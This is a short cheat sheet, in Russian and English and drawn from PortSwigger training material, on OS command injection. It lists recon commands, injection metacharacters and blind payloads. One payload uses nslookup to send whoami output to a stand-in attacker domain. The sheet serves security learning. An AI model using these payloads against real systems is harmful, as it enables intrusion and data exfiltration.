# OS Command Injection

По [материалам](https://portswigger.net/web-security/os-command-injection) PortSwigger Web Academy

## Useful commands & payloads

### Typical commands

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |

### Спец символы

```
&
&&
|
||

;
Newline (0x0a or \n)

`injected command`
$(injected command)
```

### Blind payloads

Используя задержки по времени

```
& ping -c 10 127.0.0.1 &
```

Перенаправление вывода в директорию веб-приложения

```
& whoami > /var/www/static/whoami.txt &
Check: https://vulnerable-website.com/whoami.txt
```

Через out-of-band механизм (OAST, nslookup)

```
& nslookup kgji2ohoyw.web-attacker.com &

With exfiltration (data output):
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```
